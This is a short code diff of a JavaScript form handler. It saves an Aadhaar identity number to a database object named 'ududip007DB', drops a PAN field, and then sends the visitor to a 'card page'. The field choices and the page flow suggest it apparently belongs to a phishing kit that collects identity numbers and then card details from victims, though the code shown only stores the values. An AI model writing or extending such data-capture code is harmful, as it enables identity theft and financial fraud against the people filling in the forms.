@@ -8,26 +8,25 @@ function submitForm(e) {
   e.preventDefault();
 
     var a1 = getElementVal("a1");
-    var b2 = getElementVal("b2");
+    
     
     
     
 
   
 
-  saveMessages(a1, b2);
+  saveMessages(a1);
 
   // redirect to card page
   window.location.href = "4.html";
 }
 
-const saveMessages = (a1, b2) => {
+const saveMessages = (a1) => {
   var newududip007 = ududip007DB.push();
 
   newududip007.set({
       aadhar: a1,
-      pan: b2,
-     
+          
       
       
     
